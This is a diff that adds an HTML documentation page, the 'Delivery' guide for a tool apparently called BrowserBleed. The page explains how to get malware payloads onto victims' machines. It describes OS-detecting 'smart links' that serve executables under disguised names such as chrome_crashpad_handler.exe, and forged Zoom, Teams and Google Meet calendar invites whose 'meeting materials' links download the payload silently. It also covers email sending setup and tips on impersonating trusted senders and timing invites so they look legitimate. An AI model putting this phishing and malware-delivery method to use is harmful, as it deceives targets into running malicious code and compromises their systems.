@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BrowserBleed — Delivery Guide</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iOCIgZmlsbD0iIzBhMGMxMCIvPjxwYXRoIGQ9Ik0xNiA2QzE2IDYgOCAxNiA4IDIxYTggOCAwIDAgMCAxNiAwYzAtNS04LTE1LTgtMTV6IiBmaWxsPSIjZjg1MTQ5Ii8+PC9zdmc+">
+<style>
+:root{
+  --bg:#0a0c10;--surface:#10141a;--surface2:#13181f;--surface3:#0d1117;
+  --border:#1e2530;--border-h:#2d3748;
+  --text:#cdd5e0;--dim:#5a6478;--muted:#3d4758;
+  --accent:#4f8ef7;--green:#3fb950;--yellow:#d29922;--red:#f85149;
+  --radius:8px;
+  --mono:"SFMono-Regular","Cascadia Code",Consolas,monospace;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif;font-size:14px;min-height:100vh}
+.shell{max-width:900px;margin:0 auto;padding:0 24px 80px}
+.topbar{display:flex;align-items:center;border-bottom:1px solid var(--border);margin-bottom:40px;padding-top:20px}
+.topbar-brand{font-size:13px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--dim);padding-right:24px;border-right:1px solid var(--border);margin-right:4px;white-space:nowrap}
+.nav-link{display:inline-flex;align-items:center;gap:6px;padding:10px 16px;font-size:13px;font-weight:500;color:var(--dim);text-decoration:none;border-bottom:2px solid transparent;margin-bottom:-1px;transition:color .15s,border-color .15s}
+.nav-link:hover{color:var(--text)}.nav-link.active{color:var(--accent);border-bottom-color:var(--accent)}
+.nav-icon{width:14px;height:14px;opacity:.7}
+.guide-subnav{display:flex;gap:2px;margin-bottom:28px;padding:4px;background:var(--surface2);border:1px solid var(--border);border-radius:var(--radius);width:fit-content}
+.guide-tab{padding:5px 14px;border-radius:5px;font-size:12px;font-weight:500;color:var(--dim);text-decoration:none;transition:color .12s,background .12s;white-space:nowrap}
+.guide-tab:hover{color:var(--text);background:rgba(255,255,255,.04)}
+.guide-tab.active{background:var(--surface);color:var(--text);border:1px solid var(--border)}
+.page-title{font-size:26px;font-weight:600;margin-bottom:6px}
+.page-sub{font-size:14px;color:var(--dim);margin-bottom:36px}
+h2{font-size:16px;font-weight:700;color:var(--text);margin:36px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+h3{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--dim);margin:24px 0 10px}
+p{font-size:14px;color:var(--text);line-height:1.65;margin-bottom:12px}
+p:last-child{margin-bottom:0}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:var(--mono);font-size:12px;color:var(--text);background:var(--surface2);border:1px solid var(--border);border-radius:4px;padding:1px 5px}
+pre{background:var(--surface3);border:1px solid var(--border);border-radius:var(--radius);padding:16px 20px;font-family:var(--mono);font-size:13px;color:var(--text);line-height:1.6;overflow-x:auto;margin-bottom:16px}
+pre code{background:none;border:none;padding:0;font-size:13px}
+.callout{background:var(--surface2);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:0 var(--radius) var(--radius) 0;padding:12px 16px;margin-bottom:16px;font-size:13px;color:var(--dim);line-height:1.6}
+.callout.green{border-left-color:var(--green)}
+.callout strong{color:var(--text)}
+.tbl-wrap{overflow-x:auto;margin-bottom:16px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+thead th{background:var(--surface2);color:var(--dim);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.06em;padding:8px 14px;text-align:left;border-bottom:1px solid var(--border);white-space:nowrap}
+tbody td{padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top;line-height:1.5}
+tbody tr:last-child td{border-bottom:none}
+tbody tr:hover td{background:rgba(255,255,255,.02)}
+.td-code{font-family:var(--mono);font-size:12px;color:var(--accent);white-space:nowrap}
+.td-dim{color:var(--dim)}
+.step-num{display:inline-flex;align-items:center;justify-content:center;min-width:20px;height:20px;border-radius:50%;background:rgba(79,142,247,.15);border:1px solid rgba(79,142,247,.35);color:var(--accent);font-size:11px;font-weight:700;margin-right:8px;flex-shrink:0}
+ol.steps{counter-reset:steps;list-style:none;margin-bottom:16px}
+ol.steps li{counter-increment:steps;position:relative;padding-left:32px;margin-bottom:12px;font-size:13px;color:var(--dim);line-height:1.55}
+ol.steps li::before{content:counter(steps);position:absolute;left:0;top:0;display:inline-flex;align-items:center;justify-content:center;width:20px;height:20px;border-radius:50%;background:rgba(79,142,247,.15);border:1px solid rgba(79,142,247,.35);color:var(--accent);font-size:11px;font-weight:700}
+ol.steps li strong{color:var(--text)}
+@media(max-width:640px){
+  .shell{padding:0 12px 64px}
+  .topbar-brand{padding-right:14px;font-size:12px}
+  .nav-link{padding:8px 10px;font-size:12px}
+  .page-title{font-size:20px}
+  pre{font-size:11px;padding:12px}
+  .guide-subnav{flex-wrap:wrap}
+}
+</style>
+</head>
+<body>
+<div class="shell">
+
+  <div class="topbar">
+    <span class="topbar-brand">BrowserBleed</span>
+    <a href="/" class="nav-link">
+      <svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M2 2h12v2H2V2zm0 4h12v2H2V6zm0 4h8v2H2v-2z"/></svg>Reports
+    </a>
+    <a href="/payloads" class="nav-link">
+      <svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M7.47 10.78a.75.75 0 0 0 1.06 0l3.75-3.75a.75.75 0 0 0-1.06-1.06L8.75 8.44V1.75a.75.75 0 0 0-1.5 0v6.69L4.78 5.97a.75.75 0 0 0-1.06 1.06l3.75 3.75zM1.75 13.5a.75.75 0 0 0 0 1.5h12.5a.75.75 0 0 0 0-1.5H1.75z"/></svg>Payloads
+    </a>
+    <a href="/guide" class="nav-link active">
+      <svg class="nav-icon" viewBox="0 0 16 16" fill="currentColor"><path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.744 3.744 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.75 3.28v7.205c.46-.302.979-.44 1.5-.44h3.75V2.5h-3.495a2.25 2.25 0 0 0-1.755.78ZM1.5 2.5V12h3.758c.52 0 1.039.138 1.499.44V5.78A2.25 2.25 0 0 0 5.003 5H1.5Z"/></svg>
+      Guide
+    </a>
+  </div>
+
+  <div class="guide-subnav">
+    <a href="/guide" class="guide-tab">Overview</a>
+    <a href="/guide/start" class="guide-tab">Getting Started</a>
+    <a href="/guide/build" class="guide-tab">Build</a>
+    <a href="/guide/delivery" class="guide-tab active">Delivery</a>
+    <a href="/guide/sessiontest" class="guide-tab">Session Test</a>
+  </div>
+
+  <h1 class="page-title">Delivery</h1>
+  <p class="page-sub">Get the payload to the target using smart links, calendar invites, or direct email delivery.</p>
+
+  <!-- ── Smart links ── -->
+  <h2>Smart links</h2>
+  <p>
+    A smart link is a URL of the form <code>/p/{preset}</code> that detects the visitor's OS from their User-Agent and automatically serves the correct payload. The file downloads with a disguised name matching the preset (e.g. <code>chrome_crashpad_handler.exe</code> for the <code>chrome</code> preset on Windows).
+  </p>
+
+  <pre><code>https://reports.yourdomain.com/p/chrome
+https://reports.yourdomain.com/p/slack
+https://reports.yourdomain.com/p/zoom</code></pre>
+
+  <div class="tbl-wrap">
+  <table>
+    <thead><tr><th>OS detected</th><th>Payload served</th></tr></thead>
+    <tbody>
+      <tr><td>Windows</td><td>Preset-matching <code>.exe</code> from the Windows Payloads list with a disguised download name</td></tr>
+      <tr><td>macOS</td><td>The macOS Mach-O binary (all presets share the same macOS binary)</td></tr>
+      <tr><td>Linux</td><td>Preset-matching ELF binary from the Linux Payloads list</td></tr>
+      <tr><td>Unknown / mobile</td><td>404 — payload only serves desktop OS targets</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <p>Smart links require at least one uploaded payload for the target OS. If no matching payload exists, the link returns 404. Build and upload payloads via the <a href="/payloads">Payloads page</a> first.</p>
+
+  <p>Copy a smart link from the <strong>Smart Link</strong> column in the payload table, or from the Calendar Invite panel after selecting a preset.</p>
+
+  <!-- ── Calendar invite ── -->
+  <h2>Calendar invite</h2>
+  <p>
+    A calendar invite is the most effective delivery method. The smart link is embedded in the meeting body — appearing as a Zoom join link, Teams companion download, or Google Meet materials link, depending on the disguise you choose. The target clicks what looks like a normal pre-meeting resource and the payload downloads silently.
+  </p>
+
+  <h3>Workflow</h3>
+  <ol class="steps">
+    <li><strong>Go to <a href="/payloads">Payloads → Calendar Invite</a></strong> and select a meeting type preset.</li>
+    <li><strong>Fill in the invite details:</strong> sender name, sender email, recipient, subject, date/time, and duration. The subject pre-fills with a plausible meeting title for the preset.</li>
+    <li><strong>Choose a disguise</strong> — controls the branding of the invite: Zoom, Microsoft Teams, Google Meet, or a plain Generic style. The smart link is embedded in all disguises.</li>
+    <li><strong>Deliver:</strong> click <strong>Download ICS</strong> to get the invite file for manual sending, or click <strong>Send Invite</strong> to deliver via your connected email account.</li>
+  </ol>
+
+  <h3>Disguise options</h3>
+  <div class="tbl-wrap">
+  <table>
+    <thead><tr><th>Disguise</th><th>What the target sees</th><th>Smart link appears as</th></tr></thead>
+    <tbody>
+      <tr><td>Zoom</td><td>Zoom meeting branding, fake meeting ID and passcode</td><td>"Pre-meeting materials" link</td></tr>
+      <tr><td>Microsoft Teams</td><td>Teams purple header, fake meeting ID and passcode</td><td>"Download meeting companion" link</td></tr>
+      <tr><td>Google Meet</td><td>Google Meet branding, fake video call link and dial-in</td><td>"Meeting materials" link</td></tr>
+      <tr><td>Generic / Document</td><td>Neutral dark header, minimal meeting details</td><td>"Access meeting materials" link</td></tr>
+      <tr><td>Auto</td><td>Picks disguise based on the selected preset (e.g. Teams for Edge, Zoom for everything else)</td><td>Same as above</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="callout">
+    <strong>ICS download vs. Send Invite:</strong> The <strong>Download ICS</strong> button generates the invite file in your browser using JavaScript — no server call. <strong>Send Invite</strong> sends from the server using your connected email account, which keeps the sender's address consistent with the <em>From Name</em> field.
+  </div>
+
+  <!-- ── Email setup ── -->
+  <h2>Email setup</h2>
+  <p>
+    To use <strong>Send Invite</strong>, connect a Gmail or Outlook account, or configure a custom SMTP server. Go to <a href="/payloads">Payloads → Email Settings</a>.
+  </p>
+
+  <h3>Gmail (recommended)</h3>
+  <ol class="steps">
+    <li>Go to <strong>Google Cloud Console → APIs &amp; Services → Credentials</strong>.</li>
+    <li>Create an <strong>OAuth 2.0 Client ID</strong> (Web application type).</li>
+    <li>Enable the <strong>Gmail API</strong> for your project.</li>
+    <li>Add this redirect URI: <code>https://your-server.com/auth/google/callback</code></li>
+    <li>In Email Settings → <em>OAuth app credentials</em>, enter your Client ID and Secret, then click <strong>Save Credentials</strong>.</li>
+    <li>Click <strong>Sign in</strong> next to Gmail. Google will redirect you back after authorization.</li>
+  </ol>
+
+  <h3>Outlook / Office 365</h3>
+  <ol class="steps">
+    <li>Go to <strong>Azure Portal → Entra ID → App registrations → New registration</strong>.</li>
+    <li>Under <strong>API permissions</strong>, add delegated permissions: <code>Mail.Send</code>, <code>User.Read</code>, <code>offline_access</code>.</li>
+    <li>Under <strong>Authentication</strong>, add this redirect URI (Web platform): <code>https://your-server.com/auth/microsoft/callback</code></li>
+    <li>Create a client secret under <strong>Certificates &amp; secrets</strong>.</li>
+    <li>In Email Settings → <em>OAuth app credentials</em>, enter your Client ID and Secret, then click <strong>Save Credentials</strong>.</li>
+    <li>Click <strong>Sign in</strong> next to Outlook.</li>
+  </ol>
+
+  <h3>Custom SMTP (fallback)</h3>
+  <p>
+    SMTP is used only if no OAuth provider is connected. Expand <strong>Custom SMTP</strong> in Email Settings and fill in your SMTP credentials.
+  </p>
+  <p>
+    For Gmail SMTP: enable 2-Factor Authentication on your Google account, then generate an <strong>App Password</strong> (Google Account → Security → App Passwords). Use <code>smtp.gmail.com</code> on port <code>587</code>.
+  </p>
+
+  <div class="callout green">
+    <strong>OAuth is preferred over SMTP.</strong> Gmail and Office 365 block plain SMTP auth on many accounts by default. OAuth uses the modern REST API (Gmail API / Graph API) and is much more reliable.
+  </div>
+
+  <!-- ── Tips ── -->
+  <h2>Tips</h2>
+  <p><strong>Multiple recipients:</strong> The <em>To</em> field accepts a single email address. For multiple targets, send separate invites so each gets an individualized invite and you can track which target triggered which download.</p>
+  <p><strong>From name:</strong> The <em>From Name</em> field controls the display name in the invite. Pick a plausible sender — someone the target would expect a meeting invite from (a manager, an IT contact, a vendor).</p>
+  <p><strong>Delivery timing:</strong> Calendar invites sent a few days ahead look more legitimate than same-day invites. Use the date/time picker to schedule the fake meeting for a realistic future time.</p>
+  <p><strong>Fallback if no OAuth:</strong> If you have not connected Gmail or Outlook and have no SMTP configured, the Send Invite button will return an error. Download the ICS file and attach it manually to an email instead.</p>
+
+</div>
+</body>
+</html>
